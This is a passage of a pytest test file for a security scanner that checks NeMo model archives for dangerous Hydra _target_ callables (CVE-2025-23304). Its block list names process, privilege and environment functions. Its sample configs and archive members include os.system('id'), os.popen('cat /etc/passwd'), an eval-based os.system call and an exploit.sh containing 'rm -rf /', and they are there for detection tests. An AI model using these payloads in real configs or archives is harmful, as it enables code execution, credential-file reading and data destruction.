            "pty.fork",
            "os.kill",
            "posix.kill",
            "nt.kill",
            "os.killpg",
            "posix.killpg",
            "signal.raise_signal",
            "signal.pthread_kill",
            "signal.alarm",
            "signal.setitimer",
            "signal.signal",
            "sys.exit",
            "os.abort",
            "posix.abort",
            "nt.abort",
            "os._exit",
            "posix._exit",
            "nt._exit",
            "posix.system",
            "posix.posix_spawn",
            "posix.posix_spawnp",
            "nt.execv",
            "nt.execve",
            "nt.system",
            "os.chdir",
            "posix.chdir",
            "nt.chdir",
            "os.fchdir",
            "posix.fchdir",
            "os.umask",
            "posix.umask",
            "nt.umask",
            "os.chroot",
            "posix.chroot",
            "os.setuid",
            "posix.setuid",
            "os.seteuid",
            "posix.seteuid",
            "os.setgid",
            "posix.setgid",
            "os.setegid",
            "posix.setegid",
            "os.setreuid",
            "posix.setreuid",
            "os.setregid",
            "posix.setregid",
            "os.setresuid",
            "posix.setresuid",
            "os.setresgid",
            "posix.setresgid",
            "os.setgroups",
            "posix.setgroups",
            "os.initgroups",
            "posix.initgroups",
            "os.setsid",
            "posix.setsid",
            "os.setpgid",
            "posix.setpgid",
            "os.setpgrp",
            "posix.setpgrp",
            "os.tcsetpgrp",
            "posix.tcsetpgrp",
            "os.putenv",
            "posix.putenv",
            "nt.putenv",
            "os.unsetenv",
            "posix.unsetenv",
            "nt.unsetenv",
            "os.environ.clear",
            "os.environ.pop",
            "os.environ.popitem",
            "os.environ.setdefault",
            "os.environ.update",
            "os.environ.__setitem__",
            "os.environ.__delitem__",
            "os.environ.__ior__",
            "os.environb.clear",
            "os.environb.pop",
            "os.environb.popitem",
            "os.environb.setdefault",
            "os.environb.update",
            "os.environb.__setitem__",
            "os.environb.__delitem__",
            "os.environb.__ior__",
            "sys.path.append",
            "sys.path.clear",
            "sys.path.extend",
            "sys.path.insert",
            "sys.path.pop",
            "sys.path.remove",
            "sys.path.reverse",
            "sys.path.sort",
            "sys.path.__setitem__",
            "sys.path.__delitem__",
            "sys.path.__iadd__",
            "sys.path.__imul__",
            "sys.modules.clear",
            "sys.modules.pop",
            "sys.modules.popitem",
            "sys.modules.setdefault",
            "sys.modules.update",
            "sys.modules.__setitem__",
            "sys.modules.__delitem__",
            "sys.modules.__ior__",
            "resource.setrlimit",
            "resource.prlimit",
            "os.add_dll_directory",
            "nt.add_dll_directory",
            "os.startfile",
            "nt.startfile",
            "runpy.run_module",
            "runpy.run_path",
            "operator.call",
            "asyncio.run",
            "threading.Thread.start",
            "multiprocessing.Process.start",
            "multiprocessing.Pool",
            "multiprocessing.pool.Pool",
            "multiprocessing.Manager",
            "multiprocessing.connection.Client",
            "multiprocessing.connection.Listener",
            "multiprocessing.managers.BaseManager.start",
            "multiprocessing.managers.SyncManager.start",
            "webbrowser.open_new",
            "webbrowser.open_new_tab",
        ],
    )
    def test_process_and_global_side_effect_aliases_are_dangerous(self, tmp_path: Path, target: str) -> None:
        """Exact process and cwd side effects should not fall through to INFO-only review."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )
        assert not any(
            check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "custom.spawnv_factory.SafeBuilder",
            "custom.run_path_factory.SafeBuilder",
            "custom.posix.execve_factory.SafeBuilder",
            "custom.os.fork_factory.SafeBuilder",
            "custom.os.chdir_factory.SafeBuilder",
            "custom.os.kill_factory.SafeBuilder",
            "custom.sys.exit_factory.SafeBuilder",
            "custom.signal.signal_factory.SafeBuilder",
            "custom.os.umask_factory.SafeBuilder",
            "custom.os.chroot_factory.SafeBuilder",
            "custom.os.setuid_factory.SafeBuilder",
            "custom.posix.setgroups_factory.SafeBuilder",
            "custom.os.putenv_factory.SafeBuilder",
            "custom.posix.unsetenv_factory.SafeBuilder",
            "custom.os.environ.update_factory.SafeBuilder",
            "custom.os.environb.clear_factory.SafeBuilder",
            "custom.sys.path.append_factory.SafeBuilder",
            "custom.sys.modules.clear_factory.SafeBuilder",
            "custom.os.close_factory.SafeBuilder",
            "custom.torch.save_factory.SafeBuilder",
            "custom.tarfile.TarFile.extractall_factory.SafeBuilder",
            "custom.transformers.pipeline_factory.SafeBuilder",
            "custom.socket.socket_factory.SafeBuilder",
            "custom.os.pipe_factory.SafeBuilder",
            "custom.resource.setrlimit_factory.SafeBuilder",
            "custom.os.add_dll_directory_factory.SafeBuilder",
            "custom.multiprocessing.PoolFactory.SafeBuilder",
            "custom.multiprocessing.connection.ClientFactory.SafeBuilder",
            "custom.multiprocessing.connection.ListenerFactory.SafeBuilder",
            "custom.multiprocessing.managers.BaseManagerFactory.SafeBuilder",
            "custom.webbrowser.open_new_factory.SafeBuilder",
            "operator.callable",
        ],
    )
    def test_execution_alias_near_matches_remain_review_only(self, tmp_path: Path, target: str) -> None:
        """Exact alias coverage should not promote similarly named custom factories."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Review"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.INFO
            and check.details.get("target") == target
            for check in result.checks
        )

    def test_unknown_request_named_custom_target_remains_review_only(self, tmp_path: Path) -> None:
        """Exact sink coverage should not promote benign request-like custom factories."""
        config = {"model": {"_target_": "custom_package.requests_get_factory.SafeBuilder"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        review_checks = [
            check
            for check in result.checks
            if check.name == "Hydra _target_ Review"
            and check.details.get("target") == "custom_package.requests_get_factory.SafeBuilder"
        ]
        assert len(review_checks) == 1
        assert review_checks[0].severity == IssueSeverity.INFO

    @pytest.mark.parametrize(
        "target",
        [
            "http.client.HTTPConnection.putrequest",
            "http.client.HTTPSConnection.putrequest",
            "httpx.Client.stream",
            "httpx._client.Client.stream",
            "httpx.AsyncClient.get",
            "httpx._client.AsyncClient.request",
            "ctypes.LibraryLoader",
            "tempfile.SpooledTemporaryFile",
            "glob.iglob",
            "os.walk",
            "pathlib.Path.glob",
        ],
    )
    def test_non_io_target_invocations_remain_review_only(self, tmp_path: Path, target: str) -> None:
        """Exact coverage should not promote callables that only prepare data or return lazy handles."""
        config = {"model": {"_target_": target}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        review_checks = [
            check
            for check in result.checks
            if check.name == "Hydra _target_ Review" and check.details.get("target") == target
        ]
        assert len(review_checks) == 1
        assert review_checks[0].severity == IssueSeverity.INFO

    @pytest.mark.parametrize(
        "config",
        [
            {"target_value": "os.system", "model": {"_target_": "${target_value}", "command": "id"}},
            {
                "callable": {"module": "os", "leaf": "system"},
                "model": {"_target_": "${callable.module}.${callable.leaf}", "command": "id"},
            },
            {
                "target_value": "os.system",
                "model": {"_target_": "${oc.select:target_value,{}}", "command": "id"},
            },
            {
                "leaf": "load",
                "model": {"_target_": "numpy.${oc.select:leaf,{}}", "file": "payload.npy", "allow_pickle": True},
            },
            {"safe_target": "nemo.Model", "model": {"_target_": "${safe_target}"}},
            {"safe_target": "nemo.Model", "model": {"_target_": r"\\${safe_target}"}},
            {"safe_target": "nemo.Model", "model": {"_target_": "$${safe_target}"}},
        ],
    )
    def test_interpolated_target_fails_closed(self, tmp_path: Path, config: dict[str, Any]) -> None:
        """Dynamic Hydra callable selectors must not fall through to INFO-only review."""
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [check for check in result.checks if check.name == "CVE-2025-23304: Interpolated Hydra _target_"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["target"] == config["model"]["_target_"]
        assert cve_checks[0].details["cve_id"] == "CVE-2025-23304"
        assert not any(check.name == "Hydra _target_ Review" for check in result.checks)

    @pytest.mark.parametrize(
        "target",
        ["${target_value}", r"\${target_value}", "${oc.select:target_value,{}}"],
    )
    def test_interpolated_target_fails_aggregate_scan(self, tmp_path: Path, target: str) -> None:
        """A dynamic Hydra callable selector should produce aggregate exit 1."""
        config = {"target_value": "os.system", "model": {"_target_": target, "command": "id"}}
        path = _create_nemo_file(tmp_path, config)

        result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        assert determine_exit_code(result) == 1
        assert any(
            issue.severity == IssueSeverity.CRITICAL and "Interpolated _target_" in issue.message
            for issue in result.issues
        )

    def test_interpolated_argument_for_safe_target_remains_safe(self, tmp_path: Path) -> None:
        """Only interpolated callable selectors are failed closed, not ordinary Hydra arguments."""
        config = {"optimizer_name": "adam", "model": {"_target_": "nemo.Model", "name": "${optimizer_name}"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert not any(check.name == "CVE-2025-23304: Interpolated Hydra _target_" for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Safety Check"
            and check.status == CheckStatus.PASSED
            and check.details.get("target") == "nemo.Model"
            for check in result.checks
        )

    @pytest.mark.parametrize("target", [r"\${safe_target}", r"prefix\\\${safe_target}"])
    def test_escaped_interpolation_like_target_fails_closed(self, tmp_path: Path, target: str) -> None:
        """Escaped selectors can become active after repeated OmegaConf/Hydra resolution passes."""
        config = {"safe_target": "nemo.Model", "model": {"_target_": target}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Interpolated Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )
        assert not any(check.name == "Hydra _target_ Review" for check in result.checks)

    def test_interpolated_target_diagnostics_redact_and_bound_config_evidence(self, tmp_path: Path) -> None:
        """Interpolation findings should not retain unbounded secret-bearing config strings."""
        secret = "INTERPOLATIONSECRET123"
        path_secret = "PATHSECRET456"
        target = f"${{oc.env:CALLABLE,token={secret}}}" + ("A" * 400)
        path = _create_nemo_file(
            tmp_path,
            {f"client_secret={path_secret}": {"_target_": target}},
        )

        result = NemoScanner().scan(str(path))

        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Interpolated Hydra _target_"]
        assert len(checks) == 1
        check = checks[0]
        assert secret not in check.message
        assert path_secret not in check.message
        assert secret not in check.details["target"]
        assert path_secret not in check.details["config_path"]
        assert "<redacted>" in check.details["target"]
        assert "<redacted>" in check.details["config_path"]
        assert len(check.details["target"]) <= 256
        assert len(check.details["config_path"]) <= 256

    def test_torch_load_target_fails_aggregate_scan(self, tmp_path: Path) -> None:
        """A NeMo config using torch.load should produce a security failure, not exit 0."""
        config = {"model": {"_target_": "torch.load", "f": "payload.pt"}}
        path = _create_nemo_file(tmp_path, config)

        result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        assert determine_exit_code(result) == 1
        assert any(
            issue.severity == IssueSeverity.CRITICAL and "torch.load" in issue.message for issue in result.issues
        )

    def test_top_level_list_target_detected(self, tmp_path: Path) -> None:
        """Top-level YAML lists must be traversed, not mistaken for absent config."""
        path = _create_nemo_file_from_bytes(
            tmp_path,
            b"- _target_: os.system\n  command: id\n",
        )

        result = scan_file(str(path), config={"cache_scan_results": False})

        assert result.scanner_name == "nemo"
        cve_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Dangerous Hydra _target_"]
        assert len(cve_checks) == 1
        assert cve_checks[0].status == CheckStatus.FAILED
        assert cve_checks[0].severity == IssueSeverity.CRITICAL
        assert cve_checks[0].details["target"] == "os.system"
        assert cve_checks[0].details["config_path"] == "[0]._target_"

    def test_nested_list_target_detected(self, tmp_path: Path) -> None:
        """Nested list-of-list structures should remain part of Hydra target traversal."""
        path = _create_nemo_file_from_bytes(
            tmp_path,
            b"trainer:\n  callbacks:\n    - - _target_: subprocess.Popen\n        args:\n          - whoami\n",
        )

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Dangerous Hydra _target_"]
        assert len(cve_checks) == 1
        assert cve_checks[0].details["target"] == "subprocess.Popen"
        assert cve_checks[0].details["config_path"] == "trainer.callbacks[0][0]._target_"

    def test_yaml_parser_recursion_limit_returns_inconclusive_exit2_without_cache(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Parser recursion limits should fail closed instead of escaping the scanner."""

        def raise_recursion_error(_: bytes) -> Any:
            raise RecursionError("maximum recursion depth exceeded")

        monkeypatch.setattr(yaml, "safe_load", raise_recursion_error)
        path = _create_nemo_file_from_bytes(tmp_path, b"model: safe\n")

        direct_result = NemoScanner().scan(str(path))
        assert direct_result.success is False
        assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_yaml_complexity_limit" in direct_result.metadata["scan_outcome_reasons"]

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            aggregate_result = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )

            assert aggregate_result.success is False
            assert determine_exit_code(aggregate_result) == 2
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_recursive_yaml_alias_returns_inconclusive_exit2(self, tmp_path: Path) -> None:
        """Recursive YAML aliases should stop at a controlled incomplete outcome."""
        path = _create_nemo_file_from_bytes(
            tmp_path,
            b"model: &loop\n  children:\n    - *loop\n",
        )

        direct_result = NemoScanner().scan(str(path))
        aggregate_result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        assert direct_result.success is False
        assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_recursive_alias" in direct_result.metadata["scan_outcome_reasons"]
        assert determine_exit_code(aggregate_result) == 2

    def test_wide_yaml_config_returns_inconclusive_before_enqueuing_all_children(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Wide YAML configs should respect the node budget before expanding every sibling."""
        monkeypatch.setattr(nemo_scanner_module, "NEMO_MAX_CONFIG_TRAVERSAL_NODES", 8)
        path = _create_nemo_file(
            tmp_path,
            {"model": {f"child_{index}": {"value": index} for index in range(32)}},
        )

        direct_result = NemoScanner().scan(str(path))
        aggregate_result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        assert direct_result.success is False
        assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_traversal_node_limit" in direct_result.metadata["scan_outcome_reasons"]
        assert determine_exit_code(aggregate_result) == 2

    def test_wide_yaml_config_preserves_detected_security_exit1(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Mapping-local targets must be checked before an earlier wide sibling exhausts the budget."""
        monkeypatch.setattr(nemo_scanner_module, "NEMO_MAX_CONFIG_TRAVERSAL_NODES", 8)
        wide_children = "".join(f"  child_{index}:\n    value: {index}\n" for index in range(32))
        path = _create_nemo_file_from_bytes(
            tmp_path,
            f"wide:\n{wide_children}_target_: os.system\n".encode(),
        )

        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        metadata = aggregate_result.file_metadata[str(path)]
        assert "nemo_config_traversal_node_limit" in metadata["scan_outcome_reasons"]
        assert any(issue.details.get("target") == "os.system" for issue in aggregate_result.issues)
        assert determine_exit_code(aggregate_result) == 1

    def test_wide_yaml_config_preserves_interpolated_target_exit1(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Interpolated targets found before a traversal limit retain security precedence."""
        monkeypatch.setattr(nemo_scanner_module, "NEMO_MAX_CONFIG_TRAVERSAL_NODES", 8)
        path = _create_nemo_file(
            tmp_path,
            {
                "callable": "os.system",
                "_target_": "${callable}",
                **{f"child_{index}": {"value": index} for index in range(32)},
            },
        )

        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        metadata = aggregate_result.file_metadata[str(path)]
        assert "nemo_config_traversal_node_limit" in metadata["scan_outcome_reasons"]
        assert any("Interpolated _target_" in issue.message for issue in aggregate_result.issues)
        assert determine_exit_code(aggregate_result) == 1

    def test_recursive_yaml_alias_preserves_detected_security_exit1(self, tmp_path: Path) -> None:
        """Mapping-local targets must be checked before an earlier recursive alias sibling."""
        path = _create_nemo_file_from_bytes(
            tmp_path,
            b"model: &loop\n  children:\n    - *loop\n_target_: os.system\n",
        )

        aggregate_result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        metadata = aggregate_result.file_metadata[str(path)]
        assert "nemo_config_recursive_alias" in metadata["scan_outcome_reasons"]
        assert any(issue.details.get("target") == "os.system" for issue in aggregate_result.issues)
        assert determine_exit_code(aggregate_result) == 1

    def test_reused_yaml_alias_emits_one_target_finding(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Repeated aliases should not amplify identical Hydra target diagnostics."""
        monkeypatch.setattr(nemo_scanner_module, "NEMO_MAX_CONFIG_TRAVERSAL_NODES", 1_100)
        aliases = b"  - *shared\n" * 1_000
        path = _create_nemo_file_from_bytes(
            tmp_path,
            b"shared: &shared\n  _target_: os.system\naliases:\n" + aliases,
        )

        result = NemoScanner().scan(str(path))

        target_checks = [
            check
            for check in result.checks
            if check.name == "CVE-2025-23304: Dangerous Hydra _target_" and check.details.get("target") == "os.system"
        ]
        assert len(target_checks) == 1
        assert "nemo_config_traversal_node_limit" not in result.metadata.get("scan_outcome_reasons", [])

    @pytest.mark.parametrize(
        ("payload", "expected_reason", "expected_check"),
        [
            (b"model: [unterminated\n", "nemo_config_yaml_parse_failed", "NeMo Config YAML Parsing"),
            (b"null\n", "nemo_config_invalid_structure", "NeMo Config Structure"),
            (b"just text\n", "nemo_config_invalid_structure", "NeMo Config Structure"),
        ],
    )
    def test_unanalyzable_yaml_config_returns_inconclusive_exit2(
        self,
        tmp_path: Path,
        payload: bytes,
        expected_reason: str,
        expected_check: str,
    ) -> None:
        """Present but unanalyzable configs should fail closed as inconclusive coverage."""
        path = _create_nemo_file_from_bytes(tmp_path, payload)

        direct_result = NemoScanner().scan(str(path))
        aggregate_result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        assert direct_result.success is False
        assert direct_result.has_errors is False
        assert direct_result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert expected_reason in direct_result.metadata["scan_outcome_reasons"]
        checks = [c for c in direct_result.checks if c.name == expected_check]
        assert len(checks) == 1
        assert checks[0].status == CheckStatus.FAILED
        assert checks[0].severity == IssueSeverity.INFO

        metadata = aggregate_result.file_metadata[str(path)]
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert expected_reason in metadata.get("scan_outcome_reasons")
        assert aggregate_result.success is False
        assert aggregate_result.has_errors is False
        assert determine_exit_code(aggregate_result) == 2

    def test_inconclusive_config_preserves_security_exit1(self, tmp_path: Path) -> None:
        """Security findings should keep priority over inconclusive config coverage."""
        nemo_path = tmp_path / "model.nemo"
        malformed_config = b"model: [unterminated\n"
        script = b"#!/bin/sh\nid\n"
        with tarfile.open(nemo_path, "w") as tar:
            info = tarfile.TarInfo(name="model_config.yaml")
            info.size = len(malformed_config)
            tar.addfile(info, io.BytesIO(malformed_config))
            info = tarfile.TarInfo(name="payload.sh")
            info.size = len(script)
            tar.addfile(info, io.BytesIO(script))

        result = scan_model_directory_or_file(
            str(nemo_path),
            config={"cache_scan_results": False},
        )

        metadata = result.file_metadata[str(nemo_path)]
        assert metadata.get("scan_outcome") == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_yaml_parse_failed" in metadata.get("scan_outcome_reasons")
        assert any(issue.severity == IssueSeverity.WARNING for issue in result.issues)
        assert determine_exit_code(result) == 1

    def test_dangerous_eval_detected(self, tmp_path):
        """builtins.eval _target_ should trigger CVE-2025-23304."""
        config = {"_target_": "builtins.eval", "expression": "__import__('os').system('id')"}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) > 0, "Should detect builtins.eval"

    def test_suspicious_pattern_detected(self, tmp_path: Path) -> None:
        """Unknown target containing 'eval' pattern should be flagged."""
        config = {"model": {"_target_": "custom_module.eval_function"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        suspicious_checks = [c for c in result.checks if "Suspicious" in c.name and "CVE-2025-23304" in c.name]
        assert len(suspicious_checks) > 0, f"Should flag suspicious pattern. Checks: {[c.name for c in result.checks]}"
        details = suspicious_checks[0].details
        assert details["description"]
        assert details["remediation"]

    def test_suspicious_target_with_numeric_suffix_detected(self, tmp_path: Path) -> None:
        """Suffix-number variants like eval2 should still be treated as suspicious."""
        config = {"model": {"_target_": "custom_module.eval2"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        suspicious_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Suspicious Hydra _target_"]
        assert len(suspicious_checks) == 1
        assert suspicious_checks[0].details["pattern"] == "eval"

    def test_benign_embedded_keyword_target_is_review_only(self, tmp_path: Path) -> None:
        """Benign near-match words like 'systematic' should not trigger CVE-2025-23304."""
        config = {
            "model": {"_target_": "custom_package.systematic_factory.Builder"},
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) == 0, (
            f"Benign near-match should not trigger CVE. Checks: {[c.message for c in result.checks]}"
        )

        review_checks = [c for c in result.checks if c.name == "Hydra _target_ Review"]
        assert len(review_checks) == 1
        assert review_checks[0].severity == IssueSeverity.INFO

    def test_unknown_target_diagnostics_redact_and_bound_config_evidence(self, tmp_path: Path) -> None:
        """Review diagnostics should not retain unbounded secret-bearing config strings."""
        secret = "TARGETSECRET123"
        path_secret = "PATHSECRET456"
        target = f"custom_package.Builder?token={secret}" + ("A" * 400)
        path = _create_nemo_file(
            tmp_path,
            {f"client_secret={path_secret}": {"_target_": target}},
        )

        result = NemoScanner().scan(str(path))

        review_checks = [check for check in result.checks if check.name == "Hydra _target_ Review"]
        assert len(review_checks) == 1
        check = review_checks[0]
        assert secret not in check.message
        assert path_secret not in check.message
        assert secret not in check.details["target"]
        assert path_secret not in check.details["config_path"]
        assert "<redacted>" in check.details["target"]
        assert "<redacted>" in check.details["config_path"]
        assert len(check.details["target"]) <= 256
        assert len(check.details["config_path"]) <= 256

    def test_oversized_yaml_config_is_rejected_before_parse(
        self,
        tmp_path: Path,
        monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        """Oversized YAML members should be rejected without parsing the full config payload."""

        def fail_safe_load(_: bytes) -> Any:
            raise AssertionError("safe_load should not be called for oversized configs")

        monkeypatch.setattr(yaml, "safe_load", fail_safe_load)
        oversized_config = b"notes: '" + (b"A" * (NemoScanner.MAX_CONFIG_SIZE + 1)) + b"'\n"
        path = _create_nemo_file_from_bytes(tmp_path, oversized_config)

        result = NemoScanner().scan(str(path))

        size_checks = [c for c in result.checks if c.name == "NeMo Config Size Check"]
        assert len(size_checks) == 1
        assert size_checks[0].status == CheckStatus.FAILED
        assert size_checks[0].severity == IssueSeverity.WARNING
        assert size_checks[0].message == (f"Config file too large: model_config.yaml ({len(oversized_config)} bytes)")
        assert size_checks[0].details["scan_outcome_reason"] == "nemo_config_size_limit"
        assert size_checks[0].details["max_config_size"] == NemoScanner.MAX_CONFIG_SIZE
        assert result.success is True
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_config_size_limit" in result.metadata["scan_outcome_reasons"]

        cache_dir = tmp_path / "cache"
        reset_cache_manager()
        try:
            aggregate = scan_model_directory_or_file(
                str(path),
                cache_enabled=True,
                cache_dir=str(cache_dir),
                min_cache_file_size=0,
            )
            metadata = aggregate.file_metadata[str(path)]

            assert aggregate.success is False
            assert metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
            assert metadata["scan_outcome_reasons"] == ["nemo_config_size_limit"]
            assert determine_exit_code(aggregate) == 1
            assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
        finally:
            reset_cache_manager()

    def test_safe_nemo_target_passes(self, tmp_path):
        """Known-safe NeMo/PyTorch targets should pass."""
        config = {
            "model": {"_target_": "nemo.collections.nlp.models.TextClassification"},
            "optim": {"_target_": "torch.optim.Adam"},
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) == 0, f"Safe targets should not trigger CVE. Checks: {[c.name for c in result.checks]}"

    def test_safe_prefix_not_flagged_for_suspicious_pattern(self, tmp_path):
        """Safe-prefixed target containing suspicious keyword (e.g. 'eval') should not be flagged."""
        config = {
            "model": {"_target_": "nemo.collections.nlp.eval_utils.EvalModule"},
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) == 0, (
            f"Safe-prefixed target with 'eval' should not trigger CVE. Checks: {[c.name for c in result.checks]}"
        )

    def test_safe_prefix_does_not_suppress_suspicious_leaf_target(self, tmp_path: Path) -> None:
        """Trusted namespaces must not hide obviously dangerous target components."""
        config = {
            "model": {"_target_": "nemo.eval_utils.system"},
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        suspicious_checks = [c for c in result.checks if c.name == "CVE-2025-23304: Suspicious Hydra _target_"]
        assert len(suspicious_checks) == 1
        assert suspicious_checks[0].details["pattern"] == "system"

    def test_safe_prefix_ignores_suspicious_intermediate_component(self, tmp_path: Path) -> None:
        """Namespace segments alone should not make an otherwise safe callable suspicious."""
        config = {
            "model": {"_target_": "nemo.eval.Factory"},
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) == 0

    def test_nested_target_detected(self, tmp_path):
        """Deeply nested _target_ should still be found."""
        config = {
            "model": {
                "encoder": {
                    "layers": [
                        {
                            "attention": {
                                "_target_": "os.popen",
                                "cmd": "cat /etc/passwd",
                            }
                        }
                    ]
                }
            }
        }
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if "CVE-2025-23304" in c.name]
        assert len(cve_checks) > 0, "Should detect nested _target_"

    def test_cve_details_fields(self, tmp_path):
        """CVE check details should include required fields."""
        config = {"_target_": "pickle.loads", "data": "..."}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        cve_checks = [c for c in result.checks if c.details.get("cve_id") == "CVE-2025-23304"]
        assert len(cve_checks) > 0
        details = cve_checks[0].details
        assert details["cvss"] == 7.6
        assert details["cwe"] == "CWE-94"
        assert "remediation" in details

    def test_unknown_target_review_is_info(self, tmp_path):
        """Unknown targets should be reviewable info, not warning noise."""
        config = {"model": {"_target_": "custom_package.builders.SafeFactory"}}
        path = _create_nemo_file(tmp_path, config)

        result = NemoScanner().scan(str(path))

        review_checks = [c for c in result.checks if c.name == "Hydra _target_ Review"]
        assert len(review_checks) > 0
        assert review_checks[0].severity == IssueSeverity.INFO

    def test_executable_file_in_archive_flagged(self, tmp_path):
        """Executable files (.py, .sh) in the archive should be flagged."""
        nemo_path = tmp_path / "model.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            # Add a config
            config_bytes = yaml.dump({"model": {"_target_": "nemo.Model"}}).encode()
            info = tarfile.TarInfo(name="config.yaml")
            info.size = len(config_bytes)
            tar.addfile(info, io.BytesIO(config_bytes))
            # Add suspicious script
            script = b"#!/bin/bash\nrm -rf /"
            info = tarfile.TarInfo(name="exploit.sh")
            info.size = len(script)
            tar.addfile(info, io.BytesIO(script))

        result = NemoScanner().scan(str(nemo_path))

        suspicious = [c for c in result.checks if "Suspicious File" in c.name]
        assert len(suspicious) > 0, "Should detect executable in archive"

    def test_gzip_framed_executable_file_in_archive_flagged(self, tmp_path: Path) -> None:
        """Executable archive member checks still run after accepting gzip framing."""
        nemo_path = tmp_path / "model.nemo"
        with tarfile.open(nemo_path, "w:gz") as tar:
            config_bytes = yaml.dump({"model": {"_target_": "nemo.Model"}}).encode()
            _add_tar_bytes(tar, "config.yaml", config_bytes)
            _add_tar_bytes(tar, "exploit.sh", b"#!/bin/bash\nrm -rf /")

        result = NemoScanner().scan(str(nemo_path))

        assert not [check for check in result.checks if check.rule_code == "S901"]
        suspicious = [check for check in result.checks if "Suspicious File" in check.name]
        assert len(suspicious) > 0

    def test_no_yaml_configs_fail_closed_as_inconclusive(self, tmp_path: Path) -> None:
        """Archives with no YAML should not report a clean complete scan."""
        nemo_path = tmp_path / "model.nemo"
        with tarfile.open(nemo_path, "w") as tar:
            data = b"binary weights data"
            info = tarfile.TarInfo(name="weights.bin")
            info.size = len(data)
            tar.addfile(info, io.BytesIO(data))

        direct_result = NemoScanner().scan(str(nemo_path))
        aggregate_result = scan_model_directory_or_file(
            str(nemo_path),
            config={"cache_scan_results": False},
        )

        assert direct_result.success is False
